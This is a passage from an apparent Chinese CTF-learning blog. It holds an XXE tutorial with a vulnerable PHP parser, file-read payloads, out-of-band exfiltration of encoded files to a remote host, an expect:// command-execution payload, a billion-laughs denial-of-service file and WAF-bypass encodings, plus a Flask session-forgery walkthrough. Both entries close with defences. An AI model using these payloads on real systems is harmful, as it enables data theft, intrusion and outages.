class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>file_get_contents函数读取了php:&#x2F;&#x2F;input传入的数据,但是传入的数据没有经过任何过滤,直接在loadXML函数中进行了调用并通过了echo函数输入$username的结果，这样就导致了XXE漏洞的产生。</strong></p></blockquote><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><p><strong>通过加载外部实体，利用file:&#x2F;&#x2F;、php:&#x2F;&#x2F;等伪协议读取本地文件</strong></p><p><strong>SVG格式</strong>（一种基于XML的图像文件格式，用于创建二维矢量图形）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><strong>有回显：</strong></p><p><strong>用于读取php文件、文档</strong>。</p><ul><li><p><strong>直接外部实体声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE ANY [</span><br><span class="line">                &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>引入外部DTD文档</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">        &lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br><span class="line"> </span><br><span class="line">evil.dtd内容：</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">//当然也可用参数实体</span><br></pre></td></tr></table></figure></li></ul><p><strong>无回显</strong>：</p><p><strong>利用参数实体：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>原理：连续调用了三个参数实体 %remote;%int;%send;，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p></blockquote><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a><strong>内网探测</strong></h4><p><strong>利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢</strong></p><p>探测22号端口是否开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;http://127.0.0.1.22&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><p><strong>利用xxe漏洞可以调用except:&#x2F;&#x2F;伪协议调用系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;expect://id&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a><strong>DDOS攻击</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</strong></p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="文档中的额外空格"><a href="#文档中的额外空格" class="headerlink" title="文档中的额外空格"></a><strong>文档中的额外空格</strong></h4><p>由于XXE通常在XML文档的开头，所以一些WAF为了避免处理整个文档，而<strong>只解析它的开头</strong>。但是，XML格式允许在格式化标记</p><p>属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF。</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/3549773-20241104201102341-1259290345.png"></p><h4 id="过滤SYSTEM-PUBLIC关键字"><a href="#过滤SYSTEM-PUBLIC关键字" class="headerlink" title="过滤SYSTEM,PUBLIC关键字"></a>过滤SYSTEM,PUBLIC关键字</h4><h5 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a><strong>字符编码绕过</strong></h5><p>一个xml文档不仅可以用UTF-8编码，也可以用<strong>UTF-16(两个变体 - BE和LE)<strong>、</strong>UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码</strong>。</p><p>而通过这些编码可以很容易地绕过WAF，因为通常正则表达式仅配置为但字符集。</p><p><strong>UTF-16BE编码绕过关键字</strong>：</p><p>构造poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file://etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;feedback&gt;&amp;xxe;&lt;/feedback&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>然后保存为xml文件：</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/QQ20250302-204043.png"></p><p>再转为<strong>UTF-16BE编码</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> xxe.xml|iconv -f utf-8 -t utf-16be &gt;xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p><code>iconv -f utf-8 -t utf-16be</code>：<code>-f utf-8</code> 指定输入文件的编码格式是 UTF-8。 <code>-t utf-16be</code> 指定输出文件的编码格式是 UTF-16BE（大端字节序）。</p></blockquote><p>发送：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://ip/ -H <span class="string">&quot;Content-Type:application/xml;charset=UTF-16BE&quot;</span> --data-binary @xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p>发送一个POST 请求，将 xxe.8-16be.xml 文件的内容以 UTF-16BE 编码格式通过 POST 请求发送到指定的 URL。</p></blockquote><h5 id="双重实体编码（html）绕过"><a href="#双重实体编码（html）绕过" class="headerlink" title="双重实体编码（html）绕过"></a>双重实体编码（html）绕过</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;&#x27;</span></span><br><span class="line">escaped_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&amp;#<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>;&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line"><span class="built_in">print</span>(escaped_str)</span><br><span class="line"></span><br><span class="line">//&amp;<span class="comment">#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;&quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">//&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br></pre></td></tr></table></figure><p>这样我们转义后就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p>当 XML 解析器遇到 <code>%a;</code> 时，会将其替换为参数实体 <code>a</code> 的值，也就是 <code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt;</code></p></blockquote><h4 id="过滤http"><a href="#过滤http" class="headerlink" title="过滤http"></a>过滤http</h4><p><strong>可以使用其他协议绕过，比如data:&#x2F;&#x2F;协议、file:&#x2F;&#x2F;协议加文件上传、php:&#x2F;&#x2F;filter协议加文件上传</strong></p><p>file:&#x2F;&#x2F;协议加文件上传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter协议加文件上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul><li><p><strong>禁用外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">java:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">python:</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p><strong>过滤和验证用户提交的XML数据</strong></p></li><li><p><strong>不允许XML中含有任何自己声明的DTD ,过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</strong></p></li><li><p><strong>有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> web </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> XXE </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask session伪造</title>
      <link href="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="session机制"><a href="#session机制" class="headerlink" title="session机制"></a>session机制</h2><p>由于<strong>HTTP本身是一种无状态的协议</strong>,意味着用户向我们的应用提供了用户名和密码来进行用户认证，认证通过后<strong>HTTP协议不会记录下认证后的状态</strong>，那么下一次请求时，用户还要再一次进行认证，因为根据HTTP协议，我们并不知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在用户首次登录成功后，在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这是传统的基于session认证的过程</p><p><img src="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/image-20240328144447173.png" alt="image-20240328144447173"></p><h2 id="flask-session存储方式"><a href="#flask-session存储方式" class="headerlink" title="flask session存储方式"></a>flask session存储方式</h2><p>分为两种：</p><ul><li><strong>直接存储在客户端的cookies中，而这样会产生一定的安全问题</strong></li><li><strong>存储在服务端，如：redis,memcached,mysql等等</strong></li></ul><h2 id="flask-session的工作原理"><a href="#flask-session的工作原理" class="headerlink" title="flask session的工作原理"></a>flask session的工作原理</h2><p>会话数据主要通过flask序列化为json并签名后存储在客户端的cookie中，而当用户每次请求时，flask会验证客户端发送的cookie的签名是否与服务器的<code>SECRET_KEY</code>匹配。如果签名无效，则会被丢弃。</p><h2 id="flask的session格式"><a href="#flask的session格式" class="headerlink" title="flask的session格式"></a>flask的session格式</h2><p>flask的session格式一般是由base64加密的session数据（经过了json、zlib压缩处理的字符串）、时间戳、签名组成的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure><p><strong>时间戳</strong>：用来告诉服务端数据最后一次更新的时间，超过31天的会话将会过期，变为无效会话。</p><p><strong>签名</strong>：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>SECRET_KEY</code>加密而成的，用来保证数据没有被修改。</p><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>上面我们说到flask session是利用hmac算法将session数据、时间戳加上<code>SECRET_KEY</code>签名形成的，那么我们要进行session伪造就需要得到密钥<code>SECRET_KEY</code>，如果知道secret_key我们就可以轻松进行session伪造。</p><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a></strong></p><p>工具利用：</p><ul><li><p><strong>kali安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/noraj/flask-session-cookie-manager.git &amp;&amp; <span class="built_in">cd</span> flask-session-cookie-manager</span><br></pre></td></tr></table></figure></li><li><p><strong>解码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line"></span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>-c：session数据</p><p>-s：密钥secret_key</p></blockquote></li><li><p><strong>编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure></li></ul><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul><li><p><strong>保护 SECRET_KEY</strong></p><ul><li><p>避免硬编码在代码中，使用环境变量注入。</p></li><li><p>禁止通过 Git 等版本控制泄露。</p></li><li><p>定期更换密钥，使历史 Session 失效。</p></li></ul></li><li><p><strong>服务端存储</strong></p><p>使用 <code>Flask-Session</code> 扩展将会话数据存储于服务端，避免客户端篡改。</p></li><li><p><strong>HTTPS 传输</strong></p><p>防止 Cookie 在传输过程中被窃取（启用 <code>Secure</code> 和 <code>HttpOnly</code> 属性）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 2025元旦渗透赛复现</title>
      <link href="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
